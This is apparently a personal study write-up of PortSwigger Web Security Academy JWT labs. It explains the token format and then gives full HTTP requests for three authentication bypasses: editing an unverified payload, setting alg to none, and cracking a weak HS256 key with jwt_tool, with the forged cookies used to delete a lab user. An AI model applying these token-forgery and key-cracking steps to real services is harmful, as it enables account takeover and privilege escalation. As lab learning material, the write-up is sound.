## [portswigger](https://portswigger.net/web-security/jwt#what-are-jwts)

## JWT format
- A JWT consists of 3 parts: a <span style="color:rgb(192, 0, 0)">header</span>, a <span style="color:rgb(192, 0, 0)">payload</span>, and a <span style="color:rgb(192, 0, 0)">signature</span>
- example
- 
`eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA`
- The header and payload parts of a JWT are just base64url-encoded JSON objects.
- when decode part on this jwt see
```json
{ 
	"iss": "portswigger", 
	"exp": 1648037164, 
	"name": "Carlos Montoya", 
	"sub": "carlos", 
	"role": "blog_author", 
	"email": "carlos@carlos-montoya.net", 
	"iat": 1516239022 
}
```
### JWT signature

The server that issues the token typically generates the signature by <span style="color:rgb(192, 0, 0)">hashing</span> the header and payload. In some cases, they also encrypt the resulting hash. Either way, this process involves a <span style="color:rgb(192, 0, 0)">secret signing key</span> 

## What are JWT attacks?

JWT attacks involve a user sending modified JWTs to the server in order to achieve a malicious goal.

## Exploiting flawed JWT signature verification
- servers don't usually store any information about the JWTs that they issue. Instead, each token is an entirely self-contained entity.
```json
{ "username": "carlos", "isAdmin": false }
```
- we modified username and isAdmin 

## [lab](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)  JWT authentication bypass via unverified signature
- when we log in sending this packet
```HTTP
GET /my-account?id=wiener HTTP/2
Host: 0aa10040046fd63880c158d700b00088.web-security-academy.net
Cookie: session=eyJraWQiOiIwNDRmOTI2Ny0wMTI4LTRkMGMtODM5Ny1iZDU0NjY5MWQwODIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczODU3MzMxMywic3ViIjoid2llbmVyIn0.L10YPKPmm7sm7erylcoTm8RSzIPJGWy_xvBX1xijX5KjfC8B9aCvNfWTh4Yxux2FDx60Xe1erPAsyyoXIoYyo-f2wU1ihPqQpctenjkx2n1OrItCILvSkdqTwd-Gm1TrqqWOQ7u507L2M8lF38_kt4e4KS0QZm92pie2RvhhaTB8_l-yMI0B9Ozl_LO-tWvP_5I84KB6eaFcrk833n9YXqwe7TbOT_v_hLYPjX4A5BUDB5YqEMT2u0mODI2bJOZHtwDy00Oe8_ZWk1Ba1mEyyggc6NweJxpNAJgLw9tdps_6teTkR62YQTOtGPcuBbVS3Z3D5durKTn-QQ725FVtEA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa10040046fd63880c158d700b00088.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```
- when decode part 2 jwt (payload) 
```json
{"iss":"portswigger","exp":1738572978,"sub":"wiener"}
```
- change the sub:"administrator" and replace `wiener`
- OK, find admin panel url 
- `https://0aa10040046fd63880c158d700b00088.web-security-academy.net/admin`
```HTTP
GET /admin/ HTTP/2
Host: 0aa10040046fd63880c158d700b00088.web-security-academy.net
Cookie: session=eyJraWQiOiIwNDRmOTI2Ny0wMTI4LTRkMGMtODM5Ny1iZDU0NjY5MWQwODIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczODU3Mjk3OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.LzkB4B2S_xm7f_Tz5x0AAY58oi_c75ORDL5GL2x5gVrJnbMrSXOJJ9kCN1w0teGLYLJ-Ps9YINL2hHrqNXvrFdIkWvMxYiDcVYjyUU2U4_j2Q-z4248lgbnh21RWfoygcIl-Lc4Ww-UJZFZxPgwQmyG0PccLo1ErsCKyHr8HdjV6peLQWgFsPKQUiHQc0hdgxrvnKYVOoGJK78iddeGFvOmIt4xmhcAgopkIkr83bXY1Dgv25Xkb6niphdXb0QSAfUcWAoPDKJbUYvCEFqlYtVnjl7Tg2E9dOC4d4b5ySG7S3ouftOg0lhyA0sGNTYQxlMEFa2_TzP5OJMi8_6W_dA
Content-Length: 0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa10040046fd63880c158d700b00088.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```
- server return 200 status code and in the body has admin panel
- delete carlos user 
```HTTP
GET /admin/delete?username=carlos HTTP/2
Host: 0aa10040046fd63880c158d700b00088.web-security-academy.net
Cookie: session=eyJraWQiOiIwNDRmOTI2Ny0wMTI4LTRkMGMtODM5Ny1iZDU0NjY5MWQwODIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczODU3Mjk3OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.LzkB4B2S_xm7f_Tz5x0AAY58oi_c75ORDL5GL2x5gVrJnbMrSXOJJ9kCN1w0teGLYLJ-Ps9YINL2hHrqNXvrFdIkWvMxYiDcVYjyUU2U4_j2Q-z4248lgbnh21RWfoygcIl-Lc4Ww-UJZFZxPgwQmyG0PccLo1ErsCKyHr8HdjV6peLQWgFsPKQUiHQc0hdgxrvnKYVOoGJK78iddeGFvOmIt4xmhcAgopkIkr83bXY1Dgv25Xkb6niphdXb0QSAfUcWAoPDKJbUYvCEFqlYtVnjl7Tg2E9dOC4d4b5ySG7S3ouftOg0lhyA0sGNTYQxlMEFa2_TzP5OJMi8_6W_dA
Content-Length: 0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa10040046fd63880c158d700b00088.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```

## Accepting tokens with no signature
Among other things, the JWT header contains an `alg` parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.
```json
{ "alg": "HS256", "typ": "JWT" }
```
- in attack change the `alg` value `none` and send without  signature


# [lab](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification) JWT authentication bypass via flawed signature verification
- when we login this packet sending
```HTTP
GET /my-account?id=wiener HTTP/2
Host: 0a86008e046f6c5680303f3200f30066.web-security-academy.net
Cookie: session=eyJraWQiOiI2ODVjOGFiMi01MWIzLTQwNzYtOTllMy00OTVkMGI4YmQ1ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczODU3NDQxOCwic3ViIjoid2llbmVyIn0.C2kbGeTbFEolFy0gKzIdtN-ytAKp7iPhjU3wqxM4x59E7mIUtdgMLSCk4RlAaxuoNxWOI3lDHojPGiPJKGG8HwdFwW2mj5eVDtwAF4m09f2YYki8zyrq0UFM4nPhUFAQs6_XpdO-AuKi3trsKi6VHdJuf189foR3SIs_j2KmkHFWqZjnRsgvzYXkWsgzfgUeii-kJYGR1MyzRjOVdZhYObsRM6Zk1SW1todbYALFFFoAc_Oid4HVHhcB95Ri4LZH-iJTf4xNwA0nMXP1jKXqopPypjNGNbTOATUVK-jdYu1B0SrWgFaf3RwGYYVl1Gk1Ng9GpVjPBMQ-K4QZHQXqCw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a86008e046f6c5680303f3200f30066.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```
- decode part 1 jwt and change `alg` value to `none`
```bash
 echo eyJraWQiOiI2ODVjOGFiMi01MWIzLTQwNzYtOTllMy00OTVkMGI4YmQ1ZTkiLCJhbGciOiJSUzI1NiJ9 | base64 -d
{"kid":"685c8ab2-51b3-4076-99e3-495d0b8bd5e9","alg":"RS256"}%
```
- change 
```json
{"kid":"685c8ab2-51b3-4076-99e3-495d0b8bd5e9","alg":"none"}%
eyJraWQiOiI2ODVjOGFiMi01MWIzLTQwNzYtOTllMy00OTVkMGI4YmQ1ZTkiLCJhbGciOiJub25lIn0l
```
- and send packet without <span style="color:rgb(192, 0, 0)">signature</spanan>


> [!note] Tip
>  Even if the token is unsigned, the payload part must still be terminated with a trailing dot. 
> 
- fuck carlos
```HTTP
GET /admin/delete?username=carlos HTTP/2
Host: 0a86008e046f6c5680303f3200f30066.web-security-academy.net
Cookie: session=eyJraWQiOiI2ODVjOGFiMi01MWIzLTQwNzYtOTllMy00OTVkMGI4YmQ1ZTkiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczODU3NDQxOCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a86008e046f6c5680303f3200f30066.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```

# [Lab](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key): JWT authentication bypass via weak signing key
- use wordlist recommended portswigger
- use jwt tool [repo](https://github.com/ticarpi/jwt_tool)
```bash
 p3 jwt_tool.py eyJraWQiOiJjZjQxMDc1Ni0zYzVlLTRmZTItOGE5OC02M2FlNmRmOWY3ODUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczODU3NjE0Niwic3ViIjoid2llbmVyIn0.2NgPmegkL8pPIWrhQ5vdBTxTO3QYSx188P94zm8eAKA -C -d ../../word-lists/jwt.secrets.list

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

[+] secret1 is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "secret1"
```
- OK, `secret1` signing key
![[jwt-weak.png]]
- [link](https://jwt.io)
- delete carlos
- with above created jwt 
```HTTP
GET /admin/delete?username=carlos HTTP/2
Host: 0a9100f003a338768089cb2900f80079.web-security-academy.net
Cookie: session=eyJraWQiOiJjZjQxMDc1Ni0zYzVlLTRmZTItOGE5OC02M2FlNmRmOWY3ODUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczODU3NjE0Niwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.1x7ZKR3-UEZTi-7oXpANDjtvcXYZkRZQbI_3kd7g2bo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9100f003a338768089cb2900f80079.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```
